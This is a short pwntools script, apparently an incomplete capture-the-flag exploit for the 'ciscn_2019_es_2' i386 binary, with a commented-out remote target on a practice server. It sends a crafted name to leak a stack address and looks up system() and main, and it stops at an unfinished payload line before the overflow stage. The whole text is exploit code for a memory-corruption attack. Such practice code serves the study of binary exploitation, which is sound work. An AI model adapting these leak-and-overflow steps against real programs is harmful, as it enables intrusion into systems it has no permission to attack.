from pwn import *
elf=ELF('./ciscn_2019_es_2')
context(arch='i386',os='linux',log_level='debug')
#p=remote('node4.buuoj.cn',27682)
io=process('./ciscn_2019_es_2')
system_addr=elf.plt['system']
main_addr=elf.symbols['main']
deviation=0x38     #ebp-eax
leval=0x080485FD
payload=(b'a'*0x3)+(b'b')
io.recvuntil('name?')
io.sendline(payload)
io.recvuntil('aaab')
stack=u32(io.recv(4))
print(hex(stack))
# payload=(